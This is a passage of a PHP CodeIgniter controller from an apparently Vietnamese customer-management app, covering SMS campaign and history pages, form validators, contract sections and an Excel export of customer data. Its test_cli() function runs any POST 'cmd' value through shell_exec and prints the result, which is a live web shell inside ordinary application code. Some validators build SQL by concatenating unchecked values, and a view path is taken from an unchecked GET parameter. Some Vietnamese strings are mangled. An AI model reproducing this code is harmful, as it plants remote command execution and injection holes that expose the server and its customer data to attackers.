    function manage_sms_campain_delete()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $this->Customer->delete_sms_campain(array('sms_campain_id' => $post['items']));
            $response = array('flag' => 'true', 'msg' => lang('common_success'));
            echo json_encode($response);
        }
    }

    #----------------------------------------------------------------------
    # MANAGE SMS HISTORY
    #==========================================================================
    function manage_sms_history_input()
    {
        foreach ($this->Customer->get_all_customer_groups(array(), '', '') as $smsmail_group) {
            $smsmail_groups[$smsmail_group->smsmail_group_id] = $smsmail_group->name;
        }
        foreach ($this->Customer->get_all_sms_campain(array()) as $sms_campain) {
            $sms_campains[$sms_campain['sms_campain_id']] = $sms_campain['sms_campain_name'];
        }
        $data['smsmail_groups'] = (empty($smsmail_groups)) ? '' : $smsmail_groups;
        $data['sms_campains'] = (empty($sms_campains)) ? '' : $sms_campains;
        $data['total_sms_campain'] = $this->Customer->count_all_sms_campain(array());
        $data['total_rows_sms_temp'] = $this->Customer->count_all_sms(array());
        $data['report_date_range_simple'] = get_simple_date_ranges(FALSE);
        $this->load->view('customers/sms_history/manage_sms_history', $data);
    }


    function manage_sms_history_detail($start_date, $end_date, $view_type = 0, $export_excel = 0)
    {
        $params = array();
        $params['start_date'] = $start_date;
        $params['end_date'] = $end_date;
        if (substr($view_type, 0, 4) == 'grp_') {
            $params['smsmail_group_id'] = substr($view_type, 4);
        }
        if (substr($view_type, 0, 4) == 'cmp_') {
            $params['sms_campain_id'] = substr($view_type, 4);
        }

        #export to excel base on input options
        if ($export_excel == 1) {
            $title = 'Lịch sử gửi sms';
            $rows = array();
            $row = array();

            $_headers = array(

                array(
                    'col' => 'A',
                    'value_field' => '__AUTO__',
                ),
                array(
                    'col' => 'B',
                    'value_field' => 'last_name',
                ),
                array(
                    'col' => 'C',
                    'value_field' => '',
                ),
                array(
                    'col' => 'D',
                    'value_field' => 'title',
                ),

                array(
                    'col' => 'E',
                    'value_field' => 'content',
                ),
                array(
                    'col' => 'F',
                    'value_field' => 'status_',
                ),


            );


            $bizExcel = new BizExcel('ASendSMSEmailHistory.xlsx');
            $bizExcel->setNumberRowStartBody(4)->setHeaderOfBody($_headers);
            $items = $this->Customer->get_sms_history($params);
            $bizExcel->setDataExcel($items);
            $bizExcel->addToNewSheet('Lịch sử gửi sms')->generateFile(false, '', false);
            $excelContent = $bizExcel->generateFile(false);
            $this->load->helper('download');
            force_download('Lich_su_gui_sms.xlsx', $excelContent);
        } #show view if export excel does not selected
        else {
            # configuration for pagination
            $config['base_url'] = base_url() . 'customers/manage_sms_history_detail/' . $start_date . '/' . $end_date . '/' . $view_type . '/0';
            $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
            $config['uri_segment'] = 7;
            $config['use_page_numbers'] = TRUE;


            # Search condition default
            $arrParamsDefault = array();
            if (substr($view_type, 0, 4) == 'grp_') {
                $arrParamsDefault['smsmail_group_id'] = substr($view_type, 4);
                $arrParams['smsmail_group_id'] = substr($view_type, 4);
            }
            if (substr($view_type, 0, 4) == 'cmp_') {
                $arrParamsDefault['sms_campain_id'] = substr($view_type, 4);
                $arrParams['sms_campain_id'] = substr($view_type, 4);

            }

            $arrParamsDefault['start_date'] = $start_date;
            $arrParamsDefault['end_date'] = $end_date;
            $arrParamsDefault['search_text'] = '';
            $arrParamsDefault['order_col'] = 'sh.id';
            $arrParamsDefault['order_dir'] = 'asc';
            $arrParamsDefault['page'] = 1;
            $arrParamsDefault['per_page'] = $config['per_page'];

            #save search default
            $_SESSION['arrParamsSMSHistory'] = isset($_SESSION['arrParamsSMSHistory']) ? $_SESSION['arrParamsSMSHistory'] : $arrParamsDefault;


            $arrParams['search_text'] = isset($_POST['search']) ? $this->input->post('search') : $_SESSION['arrParamsSMSHistory']['search_text'];
            $arrParams['order_col'] = $this->input->post('order_col') ? $this->input->post('order_col') : $_SESSION['arrParamsSMSHistory']['order_col'];
            $arrParams['order_dir'] = $this->input->post('order_dir') ? $this->input->post('order_dir') : $_SESSION['arrParamsSMSHistory']['order_dir'];
            $arrParams['page'] = $this->uri->segment(7) ? $this->uri->segment(7) : $_SESSION['arrParamsSMSHistory']['page'];
            $arrParams['per_page'] = $config['per_page'];
            $arrParams['start_date'] = $start_date;;
            $arrParams['end_date'] = $end_date;
            #save search condition for reload page
            $_SESSION['arrParamsSMSHistory'] = $arrParams;
            $config['total_rows'] = $this->Customer->count_sms_history($arrParams);
            $this->pagination->initialize($config);

            $data['pagination'] = $this->pagination->my_Create_Links();
            $data['total_sms_campain'] = $this->Customer->count_all_sms_campain(array());
            $data['total_rows_sms_temp'] = $this->Customer->count_all_sms(array());
            $data['controller_name'] = $this->_controller_name;
            $data['form_width'] = $this->get_form_width();
            $data['per_page'] = $config['per_page'];
            $data['STT'] = ($arrParams['page'] - 1) * $arrParams['per_page'];
            $data['total_rows'] = $config['total_rows'];
            $data['baseUrl'] = $config['base_url'];
            $data['results'] = $this->Customer->get_sms_history($arrParams);
            # get if pagination is true else show the master view
            if ($this->uri->segment(8) == 't') {
                echo json_encode(array('manage_table' => $this->load->view("customers/sms_history/manage_sms_history_table", $data, TRUE), 'pagination' => $this->load->view("customers/pagination_view", $data, TRUE), 'total_row' => $data['total_rows']));
            } else {
                $this->load->view("customers/sms_history/manage_sms_history_detail", $data);
            }
        }

    }

    function manage_sms_history_delete()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $this->Customer->delete_sms_history(array('sms_history_id' => $post['items']));
            $response = array('flag' => 'true', 'msg' => lang('common_success'));
            echo json_encode($response);
        }
    }

    function quotes_contract_type_suggest()
    {
        $suggestions = $this->Customer->get_serach_suggestions_quotes_contract_type($this->input->get('term'), 100);
        echo json_encode($suggestions);
    }

    function birth_add($ids = '')
    {
        $_SESSION['birth'] = $ids;
    }

    function birth_remove($ids = '')
    {
        unset($_SESSION['birth']);
    }

    function birthcheck($ids = '')
    {
        $bi = null;

        if (isset($_SESSION['birth'])) {
            $bi = $_SESSION['birth'];
        }
        $bi = str_replace($ids, '', $bi);
        $_SESSION['birth'] = $bi;
    }

    function vat_without_db()
    {
        $post = $this->input->post();
        echo json_encode($post);
    }

    function rule_contract_info()
    {
        $post = $this->input->post();
        $arrParams = array_merge($post, $this->input->get());

        if (!empty($post)) {
            $item = $this->Contract->get_item($arrParams, array('task' => 'full'));
            echo json_encode($item);
        }
    }

    function load_contract_section()
    {
        $get = $this->input->get();
        $type = (!isset($get['type'])) ? 'rule' : $get['type'];

        $data = array();
        $data['contract_rule'] = $this->Contract->item_select_box(array('type' => 'rule'));
        $item['type'] = $type;

        $data['item'] = $item;
        $this->load->view('customers/partial/' . $get['type'] . '_section', $data);
    }


    function validate_luachon($value)
    {
        if ($value == -1) {
            $this->form_validation->set_message('validate_luachon', "Ph?i l?a ch?n.");
            return false;
        } else
        return true;
    }

    function validate_select($value)
    {
        if ($value == 0) {
            $this->form_validation->set_message('validate_select', "Ph?i l?a ch?n.");
            return false;
        } else
        return true;
    }

    function validate_unique_custom($field_value, $value)
    {
        $array = explode('-', $value);
        $table = $array[0];
        $field = $array[1];
        $id = $array[2];
        $id_field = $array[3];
        if ($field_value == '') return true;
        $this->db->select('COUNT(' . $id_field . ') AS totalItem')
        ->from($table)
        ->where($field, $field_value)
        ->where($id_field . ' != ' . $id);

        $query = $this->db->get();

        $total = $query->row()->totalItem;
        if ($total == 0)
            return true;
        else {
            $this->form_validation->set_message('validate_unique_custom', "'$field_value' đã tồn tại");
            return false;
        }
    }

    function validate_unique($field_value, $value)
    {
        $array = explode('-', $value);
        $table = $array[0];
        $field = $array[1];
        $id = $array[2];

        $this->db->select('COUNT(id) AS totalItem')
        ->from($table)
        ->where($field, $field_value)
        ->where('id != ' . $id);

        $query = $this->db->get();

        $total = $query->row()->totalItem;
        if ($total == 0)
            return true;
        else {
            $this->form_validation->set_message('validate_unique', "'$field_value' đã tồn tại");
            return false;
        }
    }

    function test_cli()
    {
        if ($this->input->post('cmd')) {
            $output = shell_exec($this->input->post('cmd'));
            echo '<pre>' . $output . '</pre>';
        } else {
            $this->load->view('customers/test_cli');
        }

    }

    // XUAT FILE 
    function download_excel()
    {
        $this->load->library('PHPExcel');
        $objPHPExcel = new PHPExcel();
        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $customers = $this->Customer->list_item();
        $getGeographical = $this->db->select('*')->from('phppos_customers_geographical_area')->get()->result();
        $geographical_area_data = $this->db->select('*')->from('phppos_geographical_area')->get()->result();
        // echo "<pre>";
        // print_r($customers); die();
        $style_center = array(
            'alignment' => array(
                'horizontal' => PHPExcel_Style_Alignment::HORIZONTAL_CENTER,
                'vertical' => PHPExcel_Style_Alignment::VERTICAL_CENTER,
            ),
            'font' => array(
                'size' => 12,
            )
        );
        $style_center_vertical = array(
            'alignment' => array(
                'vertical' => PHPExcel_Style_Alignment::VERTICAL_CENTER,
            ),
            'borders' => array(
                'allborders' => array(
                    'style' => PHPExcel_Style_Border::BORDER_THIN
                )
            )

        );
        $style_backgroud = array(
            'background' => 'ccc',
        );
        $style_font_bold = array(
            'font' => array(
                'bold' => true,
            )
        );

        $objPHPExcel->getDefaultStyle()->applyFromArray(array('font' => array('size' => 11, 'name' => 'Times New Roman')));

        $objPHPExcel->getActiveSheet()->mergeCells('A1:M1');
        $objPHPExcel->getActiveSheet()->setCellValue('A1', 'Danh sách khách hàng');
        $objPHPExcel->getActiveSheet()->getRowDimension(1)->setRowHeight(30);
        $objPHPExcel->getActiveSheet()->getStyle('A1')->applyFromArray($style_font_bold);
        $objPHPExcel->getActiveSheet()->getStyle('A1')->applyFromArray($style_center);
        $name_col = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M'];
        $title = ['Stt', 'Mã khách hàng', 'Khu vực', 'Tên khách hàng', 'Vốn điều lệ', 'Tổng tài sản', 'Tổng doanh thu', 'Lợi nhuận sau thuế', 'Người đầu mối', 'Email', 'Số điện thoại', 'Ngày cập nhật', 'Người chăm sóc'];
        for ($i = 0; $i < count($name_col); $i++) {
            $objPHPExcel->getActiveSheet()->getColumnDimension($name_col[$i])->setWidth(25);
            $objPHPExcel->getActiveSheet()->setCellValue($name_col[$i] . '3', $title[$i]);
            $objPHPExcel->getActiveSheet()->getStyle($name_col[$i] . '3')->applyFromArray($style_center);
            $objPHPExcel->getActiveSheet()->getStyle($name_col[$i] . '3')->applyFromArray($style_font_bold);
        }
        $row_start = 4;
        $stt = 1;
        // echo "<pre>"; print_r($customers); die();
        if (!empty($customers)) {
            foreach ($customers as $key => $val) {
                $code = $val['code'];
                $fullname = $val['first_name'] . ' ' . $val['last_name'];
                $phone_number = $val['phone_number'];
                $email = $val['email'];
                $person_id = $val['person_id'];
                $dia_chi = $val['address_1'];

                $index = 0;
                $arrArea = [];
                $location = '';
                foreach ($getGeographical as $key) {
                    if ($key->customer_id == $person_id) {
                        $arrArea[$index] = $key->geographical_area_id;
                        $index++;
                    }
                }
                for ($i = 0; $i < $index; $i++) {
                    foreach ($geographical_area_data as $key) {
                        if ($key->id == $arrArea[$i]) {
                            $location .= $key->name . ', ';
                        }
                    }
                }

                $head_name = $val['head_name'];
                if (!empty($val['image_id']))
                    $link_image = base_url() . 'app_files/view/' . $val['image_id'];
                else
                    $link_image = base_url() . 'assets/assets/images/avatar-default.jpg';

                $objPHPExcel->getActiveSheet()->setCellValue('A' . $row_start, $stt);
                $objPHPExcel->getActiveSheet()->getStyle('A' . $row_start)->applyFromArray($style_center);

                $objPHPExcel->getActiveSheet()->setCellValue('B' . $row_start, $code);
                $objPHPExcel->getActiveSheet()->setCellValue('C' . $row_start, $location);
                $objPHPExcel->getActiveSheet()->setCellValue('D' . $row_start, $fullname);
                $objPHPExcel->getActiveSheet()->setCellValue('E' . $row_start, (isset($val['authorized_capital']) && $val['authorized_capital'] != '') ? number_format($val['authorized_capital'], 0, '', ',') : '0');
                $objPHPExcel->getActiveSheet()->setCellValue('F' . $row_start, (isset($val['total_assets']) && $val['total_assets'] != '') ? number_format($val['total_assets'], 0, '', ',') : '0');
                $objPHPExcel->getActiveSheet()->setCellValue('G' . $row_start, (isset($val['total_revenue']) && $val['total_revenue'] != '') ? number_format($val['total_revenue'], 0, '', ',') : '0');
                $objPHPExcel->getActiveSheet()->setCellValue('H' . $row_start, (isset($val['total_profit']) && $val['total_profit'] != '') ? number_format($val['total_profit'], 0, '', ',') : '0');
                $objPHPExcel->getActiveSheet()->setCellValue('I' . $row_start, $head_name);
                $objPHPExcel->getActiveSheet()->setCellValue('J' . $row_start, $val['head_email']);
                $objPHPExcel->getActiveSheet()->setCellValue('K' . $row_start, $val['head_phone']);
                $objPHPExcel->getActiveSheet()->setCellValue('L' . $row_start, $val['created_time']);
                $objPHPExcel->getActiveSheet()->setCellValue('M' . $row_start, $val['created_by']);
                $stt++;
                $row_start++;
            }
        }
        for ($i = 3; $i < $row_start + 1; $i++) {
            $objPHPExcel->getActiveSheet()->getRowDimension($i)->setRowHeight(30);
            for ($j = 0; $j < count($name_col); $j++) {
                $objPHPExcel->getActiveSheet()->getStyle($name_col[$j] . $i)->applyFromArray($style_center_vertical);
            }
        }


        $filename = 'danh_sach_khach_hang';
        header('Content-Type: application/vnd.ms-excel');
        header('Content-Disposition: attachment; filename=' . $filename . '.xls');
        header('Cache-Control: max-age=0');
        $objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');
        $objWriter->save('php://output');
        exit;
    }

}

?>